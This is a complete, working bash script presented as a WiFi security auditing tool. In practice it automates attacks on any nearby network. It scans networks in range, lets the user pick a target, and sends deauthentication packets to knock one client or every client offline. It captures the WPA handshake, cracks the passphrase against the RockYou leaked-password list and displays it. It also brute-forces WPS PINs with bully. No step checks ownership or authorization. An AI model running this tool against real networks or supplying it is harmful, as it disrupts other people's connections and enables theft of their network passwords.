#!/bin/bash
# -----------------------------------------------------------------------------
# Name:        wifi_audit.sh
# Description: Automated WiFi Security Auditing Tool for Arch/Hyprland
# Hardware:    Hardware Agnostic (Auto-detects Intel/Atheros/Realtek)
# Author:      Elite DevOps
# Version:     1.1.0 (Patched)
# -----------------------------------------------------------------------------

# strict mode
set -euo pipefail
IFS=$'\n\t'

# -----------------------------------------------------------------------------
# CONSTANTS & COLORS
# -----------------------------------------------------------------------------
readonly RED=$'\e[0;31m'
readonly GREEN=$'\e[0;32m'
readonly YELLOW=$'\e[1;33m'
readonly BLUE=$'\e[0;34m'
readonly CYAN=$'\e[0;36m'
readonly BOLD=$'\e[1m'
readonly NC=$'\e[0m' # No Color

readonly SCAN_PREFIX="scan_dump"
readonly CLIENT_SCAN_PREFIX="client_scan"
readonly HANDSHAKE_PREFIX="handshake"

# Secure temp directory creation
readonly TMP_DIR="$(mktemp -d -t wifi_audit_XXXXXX)"

# Store script's PID for cleanup
readonly SCRIPT_PID=$$

# -----------------------------------------------------------------------------
# UTILITIES
# -----------------------------------------------------------------------------
log_info() { printf "${BLUE}[INFO]${NC} %s\n" "$1"; }
log_success() { printf "${GREEN}[OK]${NC} %s\n" "$1"; }
log_warn() { printf "${YELLOW}[WARN]${NC} %s\n" "$1"; }
log_err() { printf "${RED}[ERR]${NC} %s\n" "$1" >&2; }

# -----------------------------------------------------------------------------
# AUTO-ELEVATION & USER DETECTION
# -----------------------------------------------------------------------------
if [[ $EUID -ne 0 ]]; then
    log_info "Elevating permissions to root (required for hardware access)..."
    exec sudo --preserve-env=TERM,WAYLAND_DISPLAY,XDG_RUNTIME_DIR,DISPLAY bash "$0" "$@"
    exit $?
fi

if [[ -n "${SUDO_USER:-}" ]]; then
    REAL_USER="$SUDO_USER"
    REAL_HOME=$(getent passwd "$SUDO_USER" | cut -d: -f6)
    REAL_GROUP=$(id -gn "$SUDO_USER")
    REAL_UID=$(id -u "$SUDO_USER")
else
    REAL_USER=$(whoami)
    REAL_HOME="$HOME"
    REAL_GROUP=$(id -gn)
    REAL_UID=$(id -u)
fi

# FIX #5: X11/Wayland compatible run_as_user
run_as_user() {
    local xdg="${XDG_RUNTIME_DIR:-/run/user/$REAL_UID}"
    local -a env_args=("XDG_RUNTIME_DIR=$xdg")
    
    # Detect display server and set appropriate variables
    if [[ -n "${WAYLAND_DISPLAY:-}" ]]; then
        env_args+=("WAYLAND_DISPLAY=$WAYLAND_DISPLAY")
    fi
    if [[ -n "${DISPLAY:-}" ]]; then
        env_args+=("DISPLAY=$DISPLAY")
    fi
    
    sudo -u "$REAL_USER" "${env_args[@]}" "$@"
}

# FIX #5: Unified clipboard function for X11/Wayland
copy_to_clipboard() {
    local text="$1"
    
    if [[ -n "${WAYLAND_DISPLAY:-}" ]] && command -v wl-copy &> /dev/null; then
        echo -n "$text" | run_as_user wl-copy
        return 0
    elif [[ -n "${DISPLAY:-}" ]] && command -v xclip &> /dev/null; then
        echo -n "$text" | run_as_user xclip -selection clipboard
        return 0
    elif [[ -n "${DISPLAY:-}" ]] && command -v xsel &> /dev/null; then
        echo -n "$text" | run_as_user xsel --clipboard --input
        return 0
    fi
    return 1
}

# -----------------------------------------------------------------------------
# CLEANUP TRAP
# -----------------------------------------------------------------------------
cleanup() {
    echo ""
    log_info "Initiating cleanup sequence..."

    # FIX #3: Kill all child processes of this script first
    pkill -P $SCRIPT_PID 2>/dev/null || true
    
    # Small delay for child processes to terminate
    sleep 0.5

    # Kill any lingering airodump/aireplay processes
    if pgrep -f "airodump-ng" > /dev/null; then
        pkill -f "airodump-ng" 2>/dev/null || true
    fi
    if pgrep -f "aireplay-ng" > /dev/null; then
        pkill -f "aireplay-ng" 2>/dev/null || true
    fi
    
    # Wait for processes to fully terminate
    sleep 0.5

    # Cleanup Monitor Interface if it was set by this script
    if [[ -n "${MON_IFACE:-}" ]]; then
        if ip link show "$MON_IFACE" >/dev/null 2>&1; then
            log_info "Stopping monitor mode on $MON_IFACE..."
            airmon-ng stop "$MON_IFACE" > /dev/null 2>&1 || true
        fi
    fi

    # Restore NetworkManager
    if ! systemctl is-active --quiet NetworkManager; then
        log_info "Restarting NetworkManager..."
        systemctl restart NetworkManager || log_warn "Failed to restart NetworkManager."
    fi

    if [[ -d "$TMP_DIR" ]]; then
        rm -rf "$TMP_DIR"
    fi

    log_success "System returned to normal state."
}
trap cleanup EXIT

# -----------------------------------------------------------------------------
# DEPENDENCY CHECK
# -----------------------------------------------------------------------------
check_deps() {
    declare -A deps=( 
        ["aircrack-ng"]="aircrack-ng"
        ["bully"]="bully"
        ["gawk"]="gawk"
        ["lspci"]="pciutils"
        ["timeout"]="coreutils"
    )
    
    local missing_pkgs=()
    for binary in "${!deps[@]}"; do
        if ! command -v "$binary" &> /dev/null; then
            missing_pkgs+=("${deps[$binary]}")
        fi
    done

    if [[ ${#missing_pkgs[@]} -gt 0 ]]; then
        log_warn "Missing dependencies: ${missing_pkgs[*]}"
        log_info "Installing via pacman..."
        pacman -Sy --noconfirm --needed "${missing_pkgs[@]}" || {
            log_err "Failed to install dependencies."
            exit 1
        }
    fi
    
    # Check for clipboard tools (non-fatal warning)
    if [[ -n "${WAYLAND_DISPLAY:-}" ]]; then
        if ! command -v wl-copy &> /dev/null; then
            log_warn "wl-copy not found. Install 'wl-clipboard' for clipboard support."
        fi
    elif [[ -n "${DISPLAY:-}" ]]; then
        if ! command -v xclip &> /dev/null && ! command -v xsel &> /dev/null; then
            log_warn "xclip/xsel not found. Install for clipboard support."
        fi
    fi
}

# -----------------------------------------------------------------------------
# PATH VALIDATION HELPER
# -----------------------------------------------------------------------------
# FIX #4: Validate user input paths for dangerous characters
validate_path() {
    local path="$1"
    # Disallow dangerous shell metacharacters that could lead to injection
    if [[ "$path" =~ [\`\$\(\)\;\&\|\<\>\!\*\?\[\]\{\}\'\"] ]]; then
        return 1
    fi
    # Disallow null bytes and control characters
    if [[ "$path" =~ [[:cntrl:]] ]]; then
        return 1
    fi
    return 0
}

# -----------------------------------------------------------------------------
# DIRECTORY SETUP
# -----------------------------------------------------------------------------
setup_directories() {
    DEFAULT_PROJECT_DIR="$REAL_HOME/Documents/wifi_testing"
    DEFAULT_HANDSHAKE_DIR="$DEFAULT_PROJECT_DIR/handshake"
    DEFAULT_LIST_DIR="$DEFAULT_PROJECT_DIR/list"

    echo ""
    log_info "Configuration: Handshake Storage"
    echo "Default: $DEFAULT_HANDSHAKE_DIR"
    read -r -p "Press ENTER to use default, or type a custom path: " user_hs_path

    # FIX #4: Validate user input path
    if [[ -z "$user_hs_path" ]]; then
        HANDSHAKE_DIR="$DEFAULT_HANDSHAKE_DIR"
    elif validate_path "$user_hs_path"; then
        HANDSHAKE_DIR="${user_hs_path%/}"
    else
        log_warn "Invalid characters in path. Using default."
        HANDSHAKE_DIR="$DEFAULT_HANDSHAKE_DIR"
    fi

    if [[ ! -d "$HANDSHAKE_DIR" ]]; then
        if ! run_as_user mkdir -p "$HANDSHAKE_DIR" 2>/dev/null; then
             mkdir -p "$HANDSHAKE_DIR"
        fi
    fi
    
    if [[ -d "$DEFAULT_PROJECT_DIR" ]]; then
         chown -R "$REAL_USER":"$REAL_GROUP" "$DEFAULT_PROJECT_DIR" || true
         chmod -R 755 "$DEFAULT_PROJECT_DIR" || true
    fi

    chown -R "$REAL_USER":"$REAL_GROUP" "$HANDSHAKE_DIR" || true
    chmod -R 755 "$HANDSHAKE_DIR" || true
    
    log_success "Handshakes will be saved to: $HANDSHAKE_DIR"

    echo ""
    log_info "Configuration: Password Wordlists"
    echo "Default: $DEFAULT_LIST_DIR"
    read -r -p "Press ENTER to use default, or type a custom path: " user_list_path

    # FIX #4: Validate user input path
    if [[ -z "$user_list_path" ]]; then
        LIST_DIR="$DEFAULT_LIST_DIR"
    elif validate_path "$user_list_path"; then
        LIST_DIR="${user_list_path%/}"
    else
        log_warn "Invalid characters in path. Using default."
        LIST_DIR="$DEFAULT_LIST_DIR"
    fi

    if [[ ! -d "$LIST_DIR" ]]; then
        if ! run_as_user mkdir -p "$LIST_DIR" 2>/dev/null; then
             mkdir -p "$LIST_DIR"
        fi
        log_warn "Directory $LIST_DIR created (it is currently empty)."
    fi

    chown -R "$REAL_USER":"$REAL_GROUP" "$LIST_DIR" || true
    chmod -R 755 "$LIST_DIR" || true
}

# -----------------------------------------------------------------------------
# INTERFACE SELECTION (AUTO-HEALING)
# -----------------------------------------------------------------------------
get_interfaces_by_type() {
    local target_type="$1"
    iw dev | awk -v type="$target_type" '
        $1=="Interface" { name=$2 } 
        $1=="type" { 
            if ($2 == type && length(name) > 0) { 
                print name
            } 
            name="" 
        }
    '
}

select_interface() {
    log_info "Scanning for wireless interfaces..."
    local -a interfaces
    
    # 1. Try to find normal Managed interfaces first
    mapfile -t interfaces < <(get_interfaces_by_type "managed")

    # 2. AUTO-FIX: If no managed interfaces, check for leftover Monitor interfaces
    if [[ ${#interfaces[@]} -eq 0 ]]; then
        local -a monitors
        mapfile -t monitors < <(get_interfaces_by_type "monitor")
        
        if [[ ${#monitors[@]} -gt 0 ]]; then
            log_warn "No managed interfaces found, but detected active monitor mode: ${monitors[*]}"
            log_info "Attempting to reset interfaces to normal state..."
            
            for mon in "${monitors[@]}"; do
                airmon-ng stop "$mon" >/dev/null 2>&1 || true
            done
            
            log_info "Waiting for drivers to reset..."
            sleep 2
            
            # Re-scan for managed interfaces
            mapfile -t interfaces < <(get_interfaces_by_type "managed")
            
            if [[ ${#interfaces[@]} -gt 0 ]]; then
                log_success "Interface reset successful."
            else
                log_err "Failed to reset interfaces. Please manually restart your computer or reload wifi modules."
                exit 1
            fi
        else
            log_err "No wireless interfaces found (Managed or Monitor)."
            exit 1
        fi
    fi

    if [[ ${#interfaces[@]} -eq 1 ]]; then
        PHY_IFACE="${interfaces[0]}"
        log_success "Auto-selected interface: $PHY_IFACE"
    else
        echo "Select interface:"
        select iface in "${interfaces[@]}"; do
            if [[ -n "$iface" ]]; then
                PHY_IFACE="$iface"
                break
            fi
        done
    fi
    
    if [[ -z "${PHY_IFACE:-}" ]]; then
        log_err "No interface selected."
        exit 1
    fi
}

# -----------------------------------------------------------------------------
# HARDWARE OPTIMIZATION & MONITOR MODE
# -----------------------------------------------------------------------------
detect_hardware() {
    # Check for Intel (iwlwifi/iwlmvm) which is common in laptops like AX201
    if lspci | grep -qi "Network controller.*Intel"; then
        log_success "Detected Intel Wi-Fi Hardware."
        return 0
    else
        log_info "Detected Generic/Other Wi-Fi Hardware."
        return 1
    fi
}

enable_monitor_mode() {
    log_info "Killing conflicting processes..."
    airmon-ng check kill > /dev/null 2>&1

    log_info "Enabling Monitor Mode on $PHY_IFACE..."
    local output
    if ! output=$(airmon-ng start "$PHY_IFACE" 2>&1); then
        log_err "Failed to start monitor mode: $output"
        exit 1
    fi
    
    sleep 1

    MON_IFACE=$(iw dev | awk '/Interface/ {name=$2} /type monitor/ {print name}')
    
    if [[ -z "$MON_IFACE" ]]; then
        MON_IFACE=$(echo "$output" | grep "monitor mode enabled" | awk -F'on ' '{print $2}' | awk -F')' '{print $1}' | tr -d '[:space:]')
    fi

    if [[ -z "$MON_IFACE" ]]; then
        log_err "Could not determine monitor interface name."
        exit 1
    fi

    log_success "Monitor mode active on: $MON_IFACE"

    # Hardware Specific Optimizations
    ip link set "$MON_IFACE" up >/dev/null 2>&1 || true
    
    if detect_hardware; then
        # Intel specific: Try to disable power save, suppress warning if kernel locks it
        log_info "Attempting Intel optimizations (Power Save OFF)..."
        if ! iw dev "$MON_IFACE" set power_save off 2>/dev/null; then
            echo "      (Note: Kernel enforced power management active - this is normal for AX201)"
        fi
    else
        # Generic
        iw dev "$MON_IFACE" set power_save off 2>/dev/null || true
    fi
}

# -----------------------------------------------------------------------------
# SCANNING
# -----------------------------------------------------------------------------
scan_targets() {
    log_info "Starting network scan (2.4GHz & 5GHz)..."
    log_info "Scanning for 10 seconds. Please wait..."

    # IMPROVEMENT: Added timeout protection for hung processes
    timeout --signal=SIGTERM 20s airodump-ng --band abg -w "$TMP_DIR/$SCAN_PREFIX" --output-format csv --write-interval 1 "$MON_IFACE" > /dev/null 2>&1 &
    local pid=$!
    
    for i in {10..1}; do
        printf "\rScanning... %d " "$i"
        sleep 1
    done
    printf "\rScanning... Done.\n"
    
    kill "$pid" > /dev/null 2>&1 || true
    wait "$pid" 2>/dev/null || true
    
    # FIX #1: Sync filesystem and increase delay to prevent race condition
    sync
    sleep 1

    local csv_file="$TMP_DIR/$SCAN_PREFIX-01.csv"
    if [[ ! -f "$csv_file" ]]; then
        log_err "Scan failed to generate output."
        exit 1
    fi

    log_info "Parsing targets..."
    echo ""
    
    local -a target_lines
    # FIX #6: Improved channel parsing with validation
    mapfile -t target_lines < <(awk -F',' '
        /Station MAC/ {exit} 
        length($14) > 1 && $1 ~ /^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$/ {
            gsub(/^ +| +$/, "", $14); # ESSID
            gsub(/^ +| +$/, "", $1);  # BSSID
            gsub(/^ +| +$/, "", $4);  # Channel
            gsub(/^ +| +$/, "", $6);  # Privacy
            gsub(/^ +| +$/, "", $9);  # Power (Signal Strength)
            
            # FIX #6: Validate and derive Band from Channel
            ch = int($4);
            if (ch < 1 || ch > 196) {
                band = "N/A";
                ch = 0;
            } else if (ch >= 1 && ch <= 14) {
                band = "2.4G";
            } else if (ch >= 32) {
                band = "5G";
            } else {
                band = "N/A";
            }

            # Output: BSSID, Power, CH, Band, SEC, ESSID
            print $1","$9","ch","band","$6","$14
        }' "$csv_file")

    if [[ ${#target_lines[@]} -eq 0 ]]; then
        log_err "No networks found."
        exit 1
    fi

    # Updated header with PWR column
    printf "${CYAN}%-3s | %-17s | %-4s | %-4s | %-5s | %-8s | %s${NC}\n" "ID" "BSSID" "PWR" "CH" "BAND" "SEC" "ESSID"
    printf "%.0s-" {1..70}
    echo ""

    local i=1
    local -a bssids channels essids

    for line in "${target_lines[@]}"; do
        # Read new pwr variable
        IFS=',' read -r bssid pwr ch band priv essid <<< "$line"
        bssids+=("$bssid")
        channels+=("$ch")
        essids+=("$essid")
        
        # Include PWR in the formatted output
        printf "%-3d | %s | %-4s | %-4s | %-5s | %-8s | %s\n" "$i" "$bssid" "$pwr" "$ch" "$band" "$priv" "$essid"
        ((i++))
    done

    echo ""
    
    while true; do
        read -r -p "Select Target ID: " selection

        if [[ "$selection" =~ ^[0-9]+$ ]] && [[ "$selection" -ge 1 ]] && [[ "$selection" -le ${#bssids[@]} ]]; then
            break
        else
            log_warn "Invalid selection. Please enter a number between 1 and ${#bssids[@]}."
        fi
    done

    local idx=$((selection - 1))
    TARGET_BSSID="${bssids[$idx]}"
    TARGET_CH="${channels[$idx]}"
    TARGET_ESSID="${essids[$idx]}"
    TARGET_ESSID_SAFE="${TARGET_ESSID//[^a-zA-Z0-9]/_}"

    log_success "Target Locked: $TARGET_ESSID ($TARGET_BSSID) on CH $TARGET_CH"
}

# -----------------------------------------------------------------------------
# ROCKYOU FINDER
# -----------------------------------------------------------------------------
# IMPROVEMENT: Search common locations for rockyou.txt
find_rockyou() {
    local paths=(
        "/usr/share/wordlists/rockyou.txt"
        "/usr/share/wordlists/rockyou.txt.gz"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt"
        "/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt.gz"
        "$REAL_HOME/wordlists/rockyou.txt"
        "$REAL_HOME/.wordlists/rockyou.txt"
        "/opt/wordlists/rockyou.txt"
        "/opt/SecLists/Passwords/Leaked-Databases/rockyou.txt"
    )
    for p in "${paths[@]}"; do
        if [[ -f "$p" ]]; then
            echo "$p"
            return 0
        fi
    done
    return 1
}

# -----------------------------------------------------------------------------
# WORDLIST GENERATION
# -----------------------------------------------------------------------------
prepare_wordlist() {
    log_info "Preparing Wordlists from: $LIST_DIR"
    
    if compgen -G "$LIST_DIR/*" > /dev/null; then
        log_info "Found password lists. Merging sequentially..."
        COMBINED_WORDLIST="$TMP_DIR/combined_passwords.txt"
        cat "$LIST_DIR"/* > "$COMBINED_WORDLIST"
        local count
        count=$(wc -l < "$COMBINED_WORDLIST")
        log_success "Merged wordlist created with $count passwords."
        FINAL_WORDLIST="$COMBINED_WORDLIST"
    else
        log_warn "No files found in $LIST_DIR."
        
        # IMPROVEMENT: Try to find rockyou in common locations
        local rockyou_path=""
        if rockyou_path=$(find_rockyou); then
            echo "Options:"
            echo "1) Use detected RockYou ($rockyou_path)"
            echo "2) Enter custom path manually"
            read -r -p "Selection [1/2] (Default 1): " wl_select
            wl_select=${wl_select:-1}
            
            if [[ "$wl_select" == "2" ]]; then
                read -r -p "Enter full path to wordlist: " custom_wl
                if [[ -f "$custom_wl" ]]; then
                    FINAL_WORDLIST="$custom_wl"
                else
                    log_err "File not found."
                    FINAL_WORDLIST=""
                fi
            else
                # Handle .gz files
                if [[ "$rockyou_path" == *.gz ]]; then
                    log_info "Decompressing rockyou.txt.gz..."
                    FINAL_WORDLIST="$TMP_DIR/rockyou.txt"
                    zcat "$rockyou_path" > "$FINAL_WORDLIST"
                else
                    FINAL_WORDLIST="$rockyou_path"
                fi
            fi
        else
            log_warn "RockYou wordlist not found in common locations."
            log_info "Common install: sudo pacman -S seclists (or download rockyou.txt manually)"
            read -r -p "Enter full path to wordlist (or press ENTER to skip cracking): " custom_wl
            if [[ -n "$custom_wl" && -f "$custom_wl" ]]; then
                FINAL_WORDLIST="$custom_wl"
            else
                log_warn "No wordlist provided. Cracking will be skipped."
                FINAL_WORDLIST=""
            fi
        fi
    fi
}

# -----------------------------------------------------------------------------
# CLIENT SCANNING & PARSING
# -----------------------------------------------------------------------------
perform_client_micro_scan() {
    log_info "Performing targeted client discovery scan (5s)..."
    
    # CRITICAL FIX: Delete previous scan files to force airodump to write to -01.csv again
    rm -f "$TMP_DIR/$CLIENT_SCAN_PREFIX"*

    # IMPROVEMENT: Added timeout protection
    timeout --signal=SIGTERM 10s airodump-ng --bssid "$TARGET_BSSID" --channel "$TARGET_CH" -w "$TMP_DIR/$CLIENT_SCAN_PREFIX" --output-format csv "$MON_IFACE" >/dev/null 2>&1 &
    local scan_pid=$!
    
    # Wait 5 seconds with visual indicator
    for i in {1..5}; do
        printf "."
        sleep 1
    done
    printf "\n"
    
    # Kill and clean up
    kill "$scan_pid" >/dev/null 2>&1 || true
    wait "$scan_pid" 2>/dev/null || true
    
    # FIX #1: Sync and wait for file writes
    sync
    sleep 0.5
}

get_connected_clients() {
    # Accepting an optional argument for the input CSV file
    local custom_csv="${1:-}"
    local specific_csv="$TMP_DIR/$CLIENT_SCAN_PREFIX-01.csv"
    local initial_csv="$TMP_DIR/$SCAN_PREFIX-01.csv"
    local source_csv=""

    # FIX #2: Add retry logic for user-generated capture file
    if [[ -n "$custom_csv" ]]; then
        local attempts=0
        while [[ ! -f "$custom_csv" && $attempts -lt 5 ]]; do
            sleep 1
            ((attempts++))
        done
        if [[ -f "$custom_csv" ]]; then
            source_csv="$custom_csv"
        fi
    fi
    
    # Fallback to other sources if custom_csv not available
    if [[ -z "$source_csv" ]]; then
        if [[ -f "$specific_csv" ]]; then
            source_csv="$specific_csv"
        elif [[ -f "$initial_csv" ]]; then
            source_csv="$initial_csv"
        else
            # No source file found, return empty
            CONNECTED_CLIENTS=()
            return
        fi
    fi

    # Find stations associated with the target BSSID
    # Output format: MAC,Power
    mapfile -t CONNECTED_CLIENTS < <(awk -F',' -v target="$TARGET_BSSID" '
        # Global CR strip for safety
        { sub(/\r$/, "") }
        
        /Station MAC/ { in_stations=1; next }
        in_stations == 1 {
            # Clean fields
            gsub(/^ +| +$/, "", $6); # BSSID
            gsub(/^ +| +$/, "", $1); # MAC
            gsub(/^ +| +$/, "", $4); # Power
            
            # $6 is BSSID in Station section, match against target
            if ($6 == target && length($1) > 0) {
                print $1","$4
            }
        }
    ' "$source_csv")
}

# -----------------------------------------------------------------------------
# ATTACK VECTORS
# -----------------------------------------------------------------------------
attack_wpa_handshake() {
    prepare_wordlist
    if [[ -z "${FINAL_WORDLIST:-}" ]] || [[ ! -f "${FINAL_WORDLIST:-}" ]]; then
        log_warn "No valid wordlist found. Capture will proceed but cracking will be skipped."
    fi

    local timestamp=$(date +%Y%m%d_%H%M%S)
    local capture_base="${HANDSHAKE_DIR}/${TARGET_ESSID_SAFE}_${timestamp}"
    local record_cmd="sudo airodump-ng -c $TARGET_CH --bssid $TARGET_BSSID -w $capture_base $MON_IFACE"

    echo ""
    log_info "Step 1: Handshake Capture"
    echo "1. I have copied the ${CYAN}capture command${NC} to your clipboard."
    echo "2. Open a new terminal."
    echo "3. Paste and run it."
    echo "4. Return here and press ENTER."
    
    # FIX #5: Use unified clipboard function (X11/Wayland compatible)
    if copy_to_clipboard "$record_cmd"; then
        log_success "Command copied to clipboard!"
    else
        log_warn "Clipboard tool not available. Copy manually:"
        echo "$record_cmd"
    fi

    read -r -p "Press ENTER when recorder is running..."

    # --- CLIENT SELECTION LOOP ---
    local target_mac=""
    # This is the file the user's command will be generating
    local user_capture_csv="${capture_base}-01.csv"

    while true; do
        get_connected_clients "$user_capture_csv"
        
        echo -e "\nTarget Selection:"
        echo "1) Broadcast Deauth (Kick Everyone)"
        
        local c=2
        if [[ ${#CONNECTED_CLIENTS[@]} -gt 0 ]]; then
            for client in "${CONNECTED_CLIENTS[@]}"; do
                 IFS=',' read -r mac pwr <<< "$client"
                 echo "$c) Specific Client: $mac (Signal: ${pwr:-?} dBm)"
                 ((c++))
            done
        else
            echo "   (No connected clients found yet)"
        fi
        
        echo "r) Refresh Client List (Read Capture File)"
        
        read -r -p "Select Target [1-$((c-1))] or 'r' (Default 1): " sel
        sel=${sel:-1}
        
        # RESCAN LOGIC
        if [[ "${sel,,}" == "r" ]]; then
            log_info "Reloading client data from capture file..."
            sleep 0.5
            continue
        fi
        
        # SELECTION LOGIC
        if [[ "$sel" -eq 1 ]]; then
            log_info "Targeting Broadcast (All Clients)"
            target_mac=""
            break
        elif [[ "$sel" -gt 1 && "$sel" -lt "$c" ]]; then
            local client_idx=$((sel - 2))
            local selected_line="${CONNECTED_CLIENTS[$client_idx]}"
            local raw_mac=$(echo "$selected_line" | cut -d',' -f1)
            # Sanitize
            target_mac="${raw_mac//[^0-9A-Fa-f:]/}"
            
            if [[ "$target_mac" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
                log_info "Targeting specific client: $target_mac"
                break
            else
                log_warn "Invalid MAC detected. Try rescanning."
            fi
        else
            log_err "Invalid selection."
        fi
    done

    # --- DEAUTH / CAPTURE LOOP ---
    echo ""
    log_info "Step 2: Sending Deauth Packets"
    
    while true; do
        # Reduced default count from 10 to 3 for shorter duration
        local burst=3
        log_info "Sending $burst groups of deauth packets..."

        # IMPROVEMENT: Added timeout protection for aireplay
        if [[ -n "$target_mac" ]]; then
            timeout --signal=SIGTERM 30s aireplay-ng -0 "$burst" -a "$TARGET_BSSID" -c "$target_mac" "$MON_IFACE" || true
        else
            timeout --signal=SIGTERM 30s aireplay-ng -0 "$burst" -a "$TARGET_BSSID" "$MON_IFACE" || true
        fi

        echo ""
        log_success "Deauth burst complete."
        echo "Check your other terminal for 'WPA Handshake: ...'"
        
        echo "Options:"
        echo "y) Yes, captured - Start Cracking"
        echo "n) No, stop attack"
        echo "r) Retry Deauth (Send more packets)"
        
        read -r -p "Choice [y/n/r]: " cap_choice
        
        if [[ "${cap_choice,,}" == "y" ]]; then
            break
        elif [[ "${cap_choice,,}" == "r" ]]; then
            continue
        else
            log_info "Aborting attack."
            return
        fi
    done
    
    # CRACKING LOGIC
    local cap_file="${capture_base}-01.cap"
    if [[ ! -f "$cap_file" ]]; then
         cap_file=$(find "$HANDSHAKE_DIR" -name "${TARGET_ESSID_SAFE}_${timestamp}*.cap" 2>/dev/null | head -n 1)
    fi

    if [[ -f "$cap_file" ]]; then
         chown "$REAL_USER":"$REAL_GROUP" "$cap_file"
         log_info "Capture file ownership transferred to $REAL_USER."
    fi

    if [[ -n "${FINAL_WORDLIST:-}" ]] && [[ -f "${FINAL_WORDLIST:-}" ]] && [[ -f "$cap_file" ]]; then
        log_info "Step 3: Cracking Password..."
        
        local key_file="$TMP_DIR/cracked_key.txt"
        rm -f "$key_file" # Ensure clean state
        
        # Run aircrack and save key to file if found
        aircrack-ng -w "$FINAL_WORDLIST" -l "$key_file" "$cap_file"
        
        if [[ -f "$key_file" ]]; then
            local cracked_key
            cracked_key=$(<"$key_file")
            
            echo ""
            printf "${GREEN}${BOLD}**************************************************${NC}\n"
            printf "${GREEN}${BOLD}*                                                *${NC}\n"
            printf "${GREEN}${BOLD}*           PASSWORD CRACKED !!!                 *${NC}\n"
            printf "${GREEN}${BOLD}*                                                *${NC}\n"
            printf "${GREEN}${BOLD}**************************************************${NC}\n"
            echo ""
            printf "${CYAN}${BOLD}   PASSPHRASE:  %s${NC}\n" "$cracked_key"
            echo ""
            printf "${GREEN}${BOLD}**************************************************${NC}\n"
            echo ""
            
            # FIX #5: Auto-copy to clipboard (X11/Wayland compatible)
            if copy_to_clipboard "$cracked_key"; then
                 log_success "Password copied to clipboard!"
            fi
        else
            log_warn "Password not found in the provided wordlist."
            log_info "Capture file saved at: $cap_file"
            log_info "You can try cracking later with: aircrack-ng -w <wordlist> $cap_file"
        fi
    elif [[ -f "$cap_file" ]]; then
        log_info "Capture file saved at: $cap_file"
        log_info "No wordlist available. Crack later with: aircrack-ng -w <wordlist> $cap_file"
    fi
}

attack_wps() {
    log_info "Starting WPS Scan via 'wash'..."
    # IMPROVEMENT: Added timeout protection
    timeout --signal=SIGTERM 15s wash -i "$MON_IFACE" 2>/dev/null | grep "$TARGET_BSSID" || true
    
    log_info "Attempting WPS PIXIE/Bruteforce via 'bully'..."
    log_warn "This may take a very long time. Press Ctrl+C to abort."
    bully -b "$TARGET_BSSID" -c "$TARGET_CH" "$MON_IFACE" -v 3
}

# -----------------------------------------------------------------------------
# MAIN
# -----------------------------------------------------------------------------
main() {
    echo "========================================"
    echo "   Arch/Hyprland Wi-Fi Security Audit   "
    echo "========================================"
    
    check_deps
    setup_directories
    select_interface
    enable_monitor_mode
    scan_targets

    echo ""
    echo "Select Attack Vector:"
    echo "1) WPA Handshake Capture + Crack"
    echo "2) WPS Attack (Bully)"
    echo "3) Exit"
    
    read -r -p "Choice [1]: " attack_choice
    attack_choice=${attack_choice:-1}

    case $attack_choice in
        1)
            attack_wpa_handshake
            ;;
        2)
            attack_wps
            ;;
        3)
            exit 0
            ;;
        *)
            log_err "Invalid choice."
            ;;
    esac

    read -r -p "Press ENTER to cleanup and exit..."
}

main
